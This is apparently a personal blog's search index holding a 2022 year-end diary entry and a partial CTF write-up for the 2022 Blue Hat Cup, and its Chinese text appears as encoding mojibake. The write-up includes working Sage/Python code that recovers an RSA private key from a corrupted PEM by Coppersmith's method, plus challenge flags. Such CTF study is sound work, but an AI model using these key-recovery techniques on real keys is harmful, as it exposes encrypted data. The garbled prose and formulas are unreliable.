<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022å¹´ç»ˆæ€»ç»“</title>
    <url>/2023/01/01/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>â€‹    2022å¹´ç»ˆäºè¿˜æ˜¯è¿‡å»äº†ï¼Œä½†è¿˜æ˜¯æ²¡ä»€ä¹ˆå®æ„Ÿï¼Œæ€»è§‰å¾—æ²¡æœ‰åšå‡ºä»€ä¹ˆç‰¹åˆ«æœ‰æ„ä¹‰çš„äº‹æƒ…ã€‚è¿™ä¸€å¹´å°±è¿™ä¹ˆè¢«è™šåº¦äº†â€¦â€¦</p>
<h5 id="å­¦ä¹ "><a href="#å­¦ä¹ " class="headerlink" title="å­¦ä¹ "></a>å­¦ä¹ </h5><p>â€‹    è¯¾ç¨‹ä¸Šçš„å­¦ä¹ å¤§éƒ¨åˆ†è¿˜å¯ä»¥ç®—æ˜¯æ¸¸åˆƒæœ‰ä½™çš„ï¼Œè™½ç„¶å°±æ™®æ™®é€šé€šçš„æ°´å¹³å§ï¼Œæ¯•ç«Ÿä¹Ÿæ²¡ä»€ä¹ˆç‰¹åˆ«å¤§çš„å¿—å‘å°±ä»¥ä¸€ç§â€œèƒ½è¿‡å°±è¡Œâ€çš„å¿ƒæ€å»å­¦ä¹ ä¹Ÿä¸èƒ½è¦æ±‚å¤ªå¤šã€‚ä½†æ˜¯æœŸæœ«çš„å¤§ä½œä¸šçœŸçš„ä¼šè®©äººç ´é˜²ï¼Œè™½ç„¶ç°åœ¨æœ‰éƒ¨åˆ†å¤§ä½œä¸šçš„ddlè¢«å»¶æœŸåˆ°ä¸‹å­¦æœŸåˆäº†ï¼Œä½†â€œå°ç»„ä½œä¸šâ€æœ¬èº«å°±å·²ç»å¾ˆè®©äººç ´é˜²äº†ï¼Œåªèƒ½å¹¸å¥½æœ€éš¾çš„ç­”è¾©å·²ç»ç»“æŸäº†ã€‚ä½†æ˜¯æ¥è¸µè€Œæ¥çš„è€ƒç ”ã€å…­çº§å’Œä¸‹å­¦æœŸæ¯”å…¶ä»–ä¸“ä¸šè€Œè¨€æ›´å¤šçš„è¯¾ç¨‹ï¼Œçªç„¶å‘ç°2023å¹¶æ²¡æœ‰è¢«æˆ‘æœŸå¾…ç€ï¼Œåªæƒ³é€ƒé¿ï¼Œä½†ä¼¼ä¹ä¹Ÿæ˜¯çœŸçš„æ²¡æœ‰åŠæ³•äº†ï¼Œä½†æ„¿èƒ½å¤ŸåšæŒä¸‹å»é¢å¯¹å§ã€‚</p>
<p>â€‹    è€ŒCTFæ–¹å‘ï¼Œåœ¨å¹´åˆçš„æ—¶å€™å­¦ä¹ çƒ­æƒ…åˆ°äº†ä¸€ä¸ªå°é«˜æ½®ï¼Œä¸»è¦æ˜¯å› ä¸ºè¢«åˆºæ¿€åˆ°äº†ã€‚éšåå°±å‚åŠ äº†å¾ˆå¤šæ¯”èµ›ï¼Œä¹Ÿæ‰“äº†å‡ æ¬¡çº¿ä¸‹æ¯”èµ›ï¼Œæ‹¿äº†å‡ æ¬¡å¥–é¡¹ï¼Œä½†æ„Ÿè§‰è¿œè¿œä¸å¤Ÿï¼Œæ¯æ¬¡æ¯”èµ›éƒ½åœ¨æ€€ç–‘è‡ªå·±ï¼šè¿™å‡ å¹´çœŸçš„æœ‰åœ¨å­¦ä¹ å—ï¼Ÿé—®å¾—å¤šäº†å°±å¼€å§‹é€ƒé¿ç°å®ï¼Œå¹»æƒ³ç€è‡ªå·±å¦‚æœæ˜¯å‘†å”¯å°±å¥½äº†ï¼Œåšä¸ªå•çº¿ç¨‹çš„å¤©æ‰ã€‚åœ¨ä½™æš¨æ¯ä¹‹åï¼ŒæœŸæœ«å­¦ä¸šå‹åŠ›å¢å¤§ï¼Œå·²ç»æœ‰å¾ˆé•¿æ—¶é—´æ²¡æœ‰å¥½å¥½å­¦ä¹ äº†ï¼Œåœ¨åšä½œä¸šé—´éš™æ—¶ä¸æ—¶æƒ³ä¸€ä¸‹å°±å¼€å§‹ç„¦è™‘å¯¼è‡´ä½œä¸šä¹Ÿæ²¡åŠæ³•å®‰å¿ƒå®Œæˆã€‚å›å®¶ä¹‹åæ›´ç”šï¼Œæ²¡æœ‰ä»»ä½•å¿ƒæ€æ”¾åˆ°å­¦ä¹ ä¸Šï¼Œæ„Ÿè§‰è¯¥è¢«éª‚ä¸€ä¸‹äº†ï¼ˆ</p>
<h5 id="æ‹çˆ±"><a href="#æ‹çˆ±" class="headerlink" title="æ‹çˆ±"></a>æ‹çˆ±</h5><p>â€‹    å¿˜äº†ä»ä»€ä¹ˆæ—¶å€™å¼€å§‹äº†ï¼Œâ€œæ‹çˆ±â€è¿›å…¥äº†ä¸€ä¸ªæ¯”è¾ƒå¹³ç¨³çš„æ—¶æœŸï¼Œæ²¡æœ‰å¤ªå¤šæƒ…ç»ªçš„ç¢°æ’ï¼Œä¹Ÿæ²¡æœ‰å¤ªå¤šç”œèœœã€‚å°±ä¸€å¤©å¤©è¿‡ç€ï¼Œä¸»è¦è¿˜æ˜¯ä¸æƒ³å½±å“åˆ°è‡ªå·±ï¼Œå·²ç»å­¦ä¼šäº†ä¸‡äº‹ä»¥è‡ªå·±ä¸ºä¸»äº†ã€‚</p>
<h5 id="æœ‹å‹ï¼ˆï¼Ÿ"><a href="#æœ‹å‹ï¼ˆï¼Ÿ" class="headerlink" title="æœ‹å‹ï¼ˆï¼Ÿ"></a>æœ‹å‹ï¼ˆï¼Ÿ</h5><p>â€‹    ç°åœ¨ä¼¼ä¹å¯¹â€œæœ‹å‹â€çš„éœ€æ±‚å·²ç»æ²¡æœ‰äº†ï¼Œæˆ–è®¸è¿˜æ˜¯ä¼šç¾¡æ…•åˆ«äººæˆç¾¤ç»“é˜Ÿï¼Œä½†æ˜¯æœ‰æ—¶å€™ä¸€ä¸ªäººä¹Ÿæ˜¯å¾ˆå¿«ä¹çš„ï¼Œè™½ç„¶å¤§å¤šæ—¶é—´è¿˜æ˜¯å’Œnpyä¸€èµ·ã€‚ä¸è¿‡è®©æˆ‘æ›´éš¾è¿‡çš„è¿˜æ˜¯å’Œä»¥å‰çš„æœ‹å‹æ¸è¡Œæ¸è¿œäº†ï¼Œæ˜æ˜å¥½åƒä¹Ÿæ²¡åšä»€ä¹ˆï¼Œä¹Ÿæ²¡è¯´ä»€ä¹ˆé”™è¯ï¼Œä½†åœ¨è·¨å¹´ç¾¤é‡Œå°±æ˜æ˜¾èƒ½æ„Ÿå—åˆ°äº†â€œå¿½ç•¥â€â€œæ•·è¡â€ï¼Œè€Œæœ‰æ—¶å€™çš„å°èšä¹Ÿèƒ½æ˜ç¡®æ„Ÿå—å‡ºæ¥</p>
<h5 id="ISFP"><a href="#ISFP" class="headerlink" title="ISFP"></a>ISFP</h5><p>â€‹    ä»å°åˆ°å¤§æœ€å®³æ€•çš„äº‹æƒ…å°±æ˜¯ä¸ºäº†æŸä»¶äº‹å»å’Œåˆ«äººäº¤æ¶‰å’Œè¢«è€å¸ˆç‚¹åå›ç­”é—®é¢˜ï¼Œæ²¡æƒ³åˆ°åœ¨å¤§å­¦éƒ½å¾—åˆ°äº†ä¸€å®šæ”¹å–„ï¼Œè¿™è¿˜æ˜¯å¤šäºäº†å°ç»„ä½œä¸šå’Œå®éªŒå®¤çš„å·¥ä½œï¼ˆ</p>
<p>â€‹    ä½†æ˜¯è¿˜æ˜¯ä¸èƒ½å¤Ÿæˆä¸ºçœŸæ­£çš„â€œé˜³è§’â€ã€‚ä¸è¿‡ç›¸å¯¹äº2021å¹´æ¥è¯´ï¼Œ2022å¹´â€œæƒ³å»æ­»â€è¿™ç§æƒ³æ³•å¥½åƒçªç„¶å°‘äº†å¾ˆå¤šï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p>
<h5 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h5><p>â€‹    å¯¹äºç°å®ç”Ÿæ´»ä¸­å‡ ä¹æ— æ—¶æ— åˆ»åœ¨æˆ´ç€æœ‰çº¿è€³æœºçš„äººï¼Œ2022å¹´å¬äº†2967é¦–æ­Œ812å°æ—¶6åˆ†ï¼Œä½œä¸ºä¸€ä¸ªç°å……å»äº†ä¸¤æ¬¡livehouseï¼Œä¸€æ¬¡tançˆ¸ä¸€æ¬¡subsã€‚å»ä¸€æ¬¡livehouseçœŸçš„ä¼šè®©äººå¼€å¿ƒå¾ˆä¹…ï¼Œå¸Œæœ›2023æœ‰æœºä¼šçš„è¯ï¼Œè¿˜æƒ³å»tançˆ¸å’Œäºè´çš„åœºï¼Œå½“ç„¶ä¹Ÿæœ‰ç‚¹æƒ³å»çœ‹ä¹é˜Ÿï¼Œä¹é˜Ÿä¼¼ä¹æ›´ä¾¿å®œä¸€ç‚¹ã€‚</p>
<p>â€‹    ä»Šå¹´æ–°ç•ªçœŸçš„ç¥ä»™æ‰“æ¶ï¼š</p>
<p>â€‹    <strong>ã€Šé—´è°è¿‡å®¶å®¶ã€‹</strong>æ¼«ç”»çœŸçš„å¾ˆå¥½çœ‹ï¼Œä½†æ˜¯çœ‹åˆ°äº†å…­åå‡ è¯å°±æ²¡çœ‹äº†ï¼Œå¥½åƒæ˜¯å› ä¸ºé‚£å‡ è¯æ¯”è¾ƒæ²‰é‡ï¼Œå¯èƒ½ä¹‹åä¼šå»è¡¥ã€‚ä½œä¸ºä¸€ä¸ªæ¼«ç”»å…šæ¥è¯´ï¼ŒåŠ¨ç”»ä¸ŠåŠéƒ¨åˆ†å‰æœŸèŠ‚å¥ç¡®å®æœ‰ç‚¹å¥‡æ€ªï¼Œä½†ä¸‹åŠéƒ¨åˆ†ç¡®å®å¥½çœ‹</p>
<p>â€‹    <strong>ã€Šjojo6 çŸ³ä¹‹æµ·ã€‹</strong>ç”±äºçœ‹åˆ°ç¬¬ä¸€éƒ¨jojoæ˜¯jojo3ï¼Œå¾ˆéš¾ä¸å¨ä¸Šé‚£ä¸ªå¼ºå¤§çš„é«˜ä¸­ç”Ÿï¼Œå¯¼è‡´jojo6ä¸€å¼€å§‹å°±å¾ˆéš¾å—ï¼Œåˆ¶ä½œæ„Ÿè§‰ç¡®å®æ²¡æœ‰å‰å‡ éƒ¨å¥½ï¼Œç‰¹åˆ«æ˜¯æ­£ç‰ˆå—å®³è€…ï¼Œæœ‰æ—¶å€™æ„Ÿè§‰å°±åƒæ˜¯åœ¨çœ‹pptï¼Œä½†æ˜¯è¿˜æ˜¯å¾ˆå–œæ¬¢</p>
<p>â€‹    <strong>ã€Šå­¤ç‹¬æ‘‡æ»šã€‹</strong>ä¸ªäººå¹´åº¦top1ï¼Œè¿½æ›´æœŸé—´é¡ºä¾¿é‡æ¸©äº†ä¸€ä¸‹konï¼ŒçœŸçš„å¾ˆéš¾ä¸è¢«å¥¹ä»¬æ‰€æ„ŸåŠ¨ï¼Œå¸Œæœ›ç¬¬äºŒå­£å¦‚æœŸåˆ°æ¥~</p>
<p>â€‹    <strong>ã€Šæ¥è‡ªæ·±æ¸Š2ã€‹</strong>ï¼ˆå…¶å®è¿˜æ²¡æœ‰çœ‹å®Œï¼Œæœ‰ç‚¹å®³æ€•ï¼‰</p>
<p>â€‹    <strong>ã€Šçµèƒ½ç™¾åˆ†ç™¾3ã€‹</strong>å› ä¸ºæ˜¯ä¸‰å­£è¿ç€çœ‹çš„ï¼Œæ‰€ä»¥çœ‹å¾—çœŸçš„å¾ˆçˆ½ï¼Œå–œæ¬¢å¤§éƒ¨åˆ†çš„è§’è‰²ï¼Œåœ¨ç¥æ ‘ç¯‡çœŸçš„å“­çš„è¦æ­»ï¼Œè¿˜å¥½æœ€åå°é…’çªå›æ¥äº†</p>
<p>â€‹    <strong>ã€Šå› ä¸ºæ˜¯åæ´¾å¤§å°å§æ‰€ä»¥å…»é­”ç‹ã€‹</strong>çœ‹åˆ°æœ€åçœŸçš„å¸Œæœ›è®©æˆ‘ä»¬å¥³ä¸»å¼€åå®«å§æ±‚æ±‚äº†ï¼Œç”·ä¸»çœŸçš„â€¦â€¦</p>
<p>â€‹    <strong>ã€Šç™¾å¦–è°±3ã€‹ã€Šæ±‰åŒ–æ—¥è®°3ã€‹ã€Šåƒä»ç‹©ã€‹</strong>ï¼Œä»”ç»†ä¸€æƒ³è¿™ä¸‰éƒ¨å›½æ¼«å±…ç„¶ä¹Ÿæ˜¯2022çš„ï¼Œè¿½æ›´çœŸçš„å¾ˆå¿«ä¹~</p>
<p>â€‹    é™¤äº†æ–°ç•ªä»Šå¹´è¿˜é‡æ¸©äº†å¾ˆå¤šè€ç•ªï¼š</p>
<p>â€‹    <strong>ã€Šç¾å¦™æ—‹å¾‹ç¬¬ä¸€å­£ã€‹</strong>ä¸‰ä¸ªä¸»è§’éƒ½å¾ˆå–œæ¬¢ï¼Œçˆ±è‰¯çš„æ€§æ ¼çœŸçš„å¾ˆè®¨äººå–œæ¬¢ï¼Œè¿™å¯¼è‡´ç¬¬äºŒå­£çœŸçš„ä¸€ç‚¹éƒ½çœ‹ä¸ä¸‹å»ï¼Œæœ€ååªçœ‹äº†ä¸€ä¸‹æ¼”å‡ºï¼Œç¬¬ä¸‰å­£çœ‹äº†ä¸€ä¸‹ï¼ŒæŸäº›äººè®¾çœŸçš„æ¬£èµä¸æ¥åŒæ—¶å¾ˆå¿ƒç–¼å¥ˆéœ²ï¼Œæ‰€ä»¥è¿˜æ˜¯æ²¡çœ‹å®Œ</p>
<p>â€‹    <strong>ã€Šç¬¨è›‹ã€æµ‹éªŒã€å¬å”¤å…½ã€‹</strong>è·Ÿç€æ³›å¼çš„10å¹´å‰æ–°ç•ªå¯¼è§†å»çœ‹çš„ï¼Œæ‰çŸ¥é“åŸæ¥â€œFFFå†›å›¢â€æ˜¯å‡ºè‡ªè¿™é‡Œï¼Œç„¶åå‘ç°ç°åœ¨å·²ç»å¾ˆå°‘äººæåˆ°è¿™ä¸ªæ¢—äº†ï¼Œå”‰</p>
<p>â€‹    <strong>ã€Šèµ›é©¬å¨˜ã€‹</strong>åœ¨é«˜ä¸­çš„æ—¶å€™å°±ä¸€ç›´æœ‰äººå®‰åˆ©ï¼Œä½†æ˜¯å±äºæ˜¯åˆ«äººè¶Šå®‰åˆ©è¶Šä¸æƒ³å»çœ‹ï¼Œç„¶åç°åœ¨çªç„¶å»è¡¥ï¼Œç”±äºè¡¨è¾¾è¿‡äºè´«ç˜ ï¼Œå°±ä¸€å¥çœŸçš„å¾ˆå¥½çœ‹~</p>
<p>â€‹    æš‚æ—¶æƒ³ä¸åˆ°äº†ï¼Œä»Šå¹´çœ‹çš„ç•ªè¿˜æ˜¯è›®å¤šçš„ï¼Œå¯èƒ½çœŸçš„åœ¨ç°å®ç”Ÿæ´»ä¸­è¶Šå¿™ï¼Œå°±ä¼šçªç„¶å–œæ¬¢æ‰¾ç‚¹ç•ªå‰§çœ‹çœ‹ï¼Œæƒ³é€ƒç¦»ä¸‰æ¬¡å…ƒã€‚æœ‰ç‚¹æœŸå¾…æ³›é¸½é¸½çš„å­¤ç‹¬æ‘‡æ»šMADï¼Œåæœˆä»¥æ¥åˆ·äºŒåˆ›çœŸçš„å¤ªå¿«ä¹äº†</p>
<h5 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h5><ul>
<li><input disabled="" type="checkbox"> å¥½å¥½å­¦ä¹ ï¼Œå¤©å¤©å‘ä¸Š</li>
<li><input disabled="" type="checkbox"> åŠªåŠ›æˆä¸ºâ€œé˜³è§’â€</li>
<li><input disabled="" type="checkbox"> å¥½å¥½æ´»ç€</li>
<li><input disabled="" type="checkbox"> èµšé’±</li>
<li><input disabled="" type="checkbox"> å¼€å¿ƒä¸€ç‚¹</li>
<li><input disabled="" type="checkbox"> ä¸–ç•Œå’Œå¹³</li>
</ul>
<h5 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h5><p>å±äºæ˜¯ä¸€ä¸ªæ²¡æœ‰ä»»ä½•æ–‡ç¬”å¯è¨€çš„å¹´ç»ˆæ€»ç»“ï¼Œå¤ªæ„è¯†æµä¸ªäººå‘äº†ã€‚è¡¨è¾¾æ¬²ä¹Ÿç‰¹åˆ«åŒ®ä¹ï¼ŒçœŸä¸æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ç°è±¡ã€‚</p>
<p>åªèƒ½æœŸå¾…å¿™ç¢Œçš„2023èƒ½æœ‰ä¸€ä¸ªå¥½çš„ç»“æœã€‚</p>
<p>å¸Œæœ›ä¸–ç•Œå’Œå¹³ğŸ™</p>
]]></content>
      <categories>
        <category>Ameuu</category>
      </categories>
      <tags>
        <tag>å¹´ç»ˆæ€»ç»“</tag>
      </tags>
  </entry>
  <entry>
    <title>2022ç¬¬å…­å±Šè“å¸½æ¯åˆèµ›éƒ¨åˆ†wp</title>
    <url>/2022/07/11/2022%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    <content><![CDATA[<h1 id="é˜Ÿä¼åç§°"><a href="#é˜Ÿä¼åç§°" class="headerlink" title="é˜Ÿä¼åç§°"></a>é˜Ÿä¼åç§°</h1><p><strong>æˆ‘ä»¬ä¼šä¸‹è›Š</strong></p>
<h1 id="æ’å"><a href="#æ’å" class="headerlink" title="æ’å"></a>æ’å</h1><p><img src="https://img-blog.csdnimg.cn/361848c3c8cf4fb6af523dfe46d9ed53.png" alt="å›¾ç‰‡">æ€»æ’ä½ï¼š74å ä¸œéƒ¨èµ›åŒºï¼š29å</p>
<h1 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ez-Gadget"><a href="#ez-Gadget" class="headerlink" title="ez_Gadget"></a>ez_Gadget</h3><p><a href="https://ameuu.github.io/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF-EzGadget/">https://ameuu.github.io/2022/07/11/%E8%93%9D%E5%B8%BD%E6%9D%AF-EzGadget/</a></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="corrupted-key"><a href="#corrupted-key" class="headerlink" title="corrupted_key"></a>corrupted_key</h3><h4 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">key = RSA.generate(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&#x27;wb&#x27;</span>).write(PKCS1_OAEP.new(key.publickey()).encrypt(flag))</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;priv.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(key.exportKey(<span class="string">&#x27;PEM&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span><br><span class="line">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span><br><span class="line">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span><br><span class="line">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒ<a href="https://zhuanlan.zhihu.com/p/461349946">pemè§£æ</a></p>
<p>base64è§£ç  å†è½¬hex</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">30</span> <span class="number">82</span> 02 5e 02 01 <span class="number">00</span> 02 <span class="number">81</span> <span class="number">81</span> <span class="number">00</span> d7 <span class="number">15</span> <span class="number">25</span> 06 aa 9c ec 05 e5 <span class="number">33</span> 5d 6b <span class="number">46</span> f5 <span class="number">49</span> <span class="number">14</span> 07 c3 <span class="number">19</span> 9f d5 <span class="number">10</span> <span class="number">91</span> f1 f6 03 0d <span class="number">37</span> <span class="number">62</span> b9 e0 3f <span class="number">49</span> c9 dc dc 07 <span class="number">50</span> <span class="number">54</span> e0 cc <span class="number">14</span> 8b <span class="number">97</span> 4b <span class="number">41</span> <span class="number">85</span> 4b d9 3b 4e e1 6a 2a <span class="number">87</span> 6e e6 <span class="number">20</span> 05 e8 0e f8 06 b7 aa 3b <span class="number">64</span> b1 bf 9b 1f a7 <span class="number">73</span> e3 <span class="number">53</span> d0 cd b9 ff <span class="number">97</span> <span class="number">83</span> dd d5 f5 e6 <span class="number">74</span> <span class="number">99</span> ad <span class="number">10</span> f3 <span class="number">61</span> e9 <span class="number">38</span> d0 0b <span class="number">82</span> a6 a4 c4 2a 05 <span class="number">35</span> c5 e7 <span class="number">67</span> <span class="number">21</span> <span class="number">79</span> 8e <span class="number">86</span> b4 5c d4 b8 d0 3b 0d 7e <span class="number">75</span> c2 be <span class="number">87</span> <span class="number">66</span> a1 e8 <span class="number">43</span> bd c6 <span class="number">41</span> 02 03 01 <span class="number">00</span> 01</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c9 0b ce cf 1c ba b3 <span class="number">35</span> <span class="number">85</span> <span class="number">85</span> e8 a0 <span class="number">41</span> d1 b1 02 <span class="number">41</span> <span class="number">00</span> e3 01 6c b3 <span class="number">60</span> 9c 1d <span class="number">64</span> 3c <span class="number">16</span> <span class="number">74</span> <span class="number">39</span> c3 b9 <span class="number">38</span> b8 <span class="number">81</span> f4 <span class="number">23</span> 7f <span class="number">24</span> <span class="number">86</span> 0d 3b 1c b8 5a <span class="number">62</span> 6d 5c cd <span class="number">47</span> <span class="number">26</span> <span class="number">96</span> 4e 0f <span class="number">82</span> <span class="number">70</span> d6 c4 df 9e bf eb cc <span class="number">53</span> 8e 4e e5 e1 a7 b7 <span class="number">36</span> 8e de <span class="number">51</span> ec 6a e9 <span class="number">17</span> f7 8e b5 <span class="number">98</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°nå’Œeè¿˜æœ‰dqçš„ä½120ä½å’Œinv(q,p)</p>
<p>$e<em>dq=e</em>d=1 mod (q-1)$</p>
<p>$e<em>dq=1+k</em>(q-1)=k*q-k+1$</p>
<p>$e<em>dq+k-1=k</em>q$</p>
<p>k&lt;eçš„</p>
<p>é‚£ä¹ˆ</p>
<p>qçš„ä½120ä½</p>
<p>$q_{low}=inv(k,2<strong>120)<em>(e</em>dq+k-1)mod(2</strong>120)$</p>
<p>$q=2*<em>120</em>x+q_{los}$</p>
<p>$f=inv(q,p)<em>q</em>q-qmod n=0$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">n=<span class="number">0xD7152506AA9CEC05E5335D6B46F5491407C3199FD51091F1F6030D3762B9E03F49C9DCDC075054E0CC148B974B41854BD93B4EE16A2A876EE62005E80EF806B7AA3B64B1BF9B1FA773E353D0CDB9FF9783DDD5F5E67499AD10F361E938D00B82A6A4C42A0535C5E76721798E86B45CD4B8D03B0D7E75C2BE8766A1E843BDC641</span></span><br><span class="line">ni=<span class="number">0xE3016CB3609C1D643C167439C3B938B881F4237F24860D3B1CB85A626D5CCD4726964E0F8270D6C4DF9EBFEBCC538E4EE5E1A7B7368EDE51EC6AE917F78EB598</span></span><br><span class="line">dd=<span class="number">0xC90BCECF1CBAB3358585E8A041D1B1</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">s=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">65537</span>)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tt=gmpy2.invert(i,<span class="number">2</span>**<span class="number">120</span>)*(e*dd+(i-<span class="number">1</span>))%<span class="number">2</span>**<span class="number">120</span></span><br><span class="line">        s.append(tt)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(s))):</span><br><span class="line">    f=ni*(<span class="number">2</span>^<span class="number">120</span>*x+<span class="built_in">int</span>(s[i]))^<span class="number">2</span>-(<span class="number">2</span>^<span class="number">120</span>*x+<span class="built_in">int</span>(s[i]))</span><br><span class="line">    f=f.monic()</span><br><span class="line">    root=f.small_roots(X=<span class="number">2</span>^<span class="number">392</span>,beta=<span class="number">1</span>,epsilon=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        <span class="built_in">print</span>(root)</span><br><span class="line">        <span class="built_in">print</span>(s[i])</span><br><span class="line">[<span class="number">9380741476733074711154157347870852768998932500826815763908882209540022808328010581994168722390477477733053186137042700</span>]</span><br><span class="line"><span class="number">954648658690918505830691475676983889</span></span><br></pre></td></tr></table></figure>

<p>så€’ç€è·‘å¿«ä¸€ç‚¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line">n=<span class="number">0xD7152506AA9CEC05E5335D6B46F5491407C3199FD51091F1F6030D3762B9E03F49C9DCDC075054E0CC148B974B41854BD93B4EE16A2A876EE62005E80EF806B7AA3B64B1BF9B1FA773E353D0CDB9FF9783DDD5F5E67499AD10F361E938D00B82A6A4C42A0535C5E76721798E86B45CD4B8D03B0D7E75C2BE8766A1E843BDC641</span></span><br><span class="line">x=<span class="number">9380741476733074711154157347870852768998932500826815763908882209540022808328010581994168722390477477733053186137042700</span></span><br><span class="line">s=<span class="number">954648658690918505830691475676983889</span></span><br><span class="line">q=<span class="number">2</span>^<span class="number">120</span>*x+s</span><br><span class="line"><span class="built_in">print</span>(n%q)</span><br><span class="line">p=n//q</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">d=inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c=bytes_to_long(f.read())</span><br><span class="line"></span><br><span class="line">key = RSA.construct((n, e, d, p, q))</span><br><span class="line">cipher = PKCS1_OAEP.new(key=key)</span><br><span class="line"><span class="built_in">print</span>(cipher.decrypt(long_to_bytes(c)))</span><br></pre></td></tr></table></figure>

<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="domainhacker"><a href="#domainhacker" class="headerlink" title="domainhacker"></a>domainhacker</h3><p>å¾ˆå…¸å‹çš„é¢˜ç›®ï¼Œå…ˆå¯¼å‡ºraræ–‡ä»¶</p>
<p><img src="https://img-blog.csdnimg.cn/98a00c0cf865413ba4f02cd9fb8c96e8.png" alt="å›¾ç‰‡"></p>
<p>ç›´æ¥è¿½è¸ªåˆ°æµ13,å…ˆè§£ç ä¸€ä¸‹ï¼Œç„¶åé€‰ä¸­[2:]ï¼Œå†å»è§£ç </p>
<p><img src="https://img-blog.csdnimg.cn/e000264c134e4cf7a03d4532bd41619e.png" alt="å›¾ç‰‡"></p>
<p>å¾—åˆ°å‹ç¼©åŒ…å¯†ç </p>
<p><img src="https://img-blog.csdnimg.cn/4edf6349bc204cb8978ac01c3cdd04f1.png" alt="å›¾ç‰‡"></p>
<p>è§£å‹ï¼Œç„¶åå°è¯•ä¸€ä¸ªï¼ŒæˆåŠŸï¼Œå°±æ˜¯flag</p>
<p><img src="https://img-blog.csdnimg.cn/1bf925b52d4e4ae7998c666092870248.png" alt="å›¾ç‰‡"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;416f89c3a5deb1d398a1a1fce93862a7&#125;</span><br></pre></td></tr></table></figure>

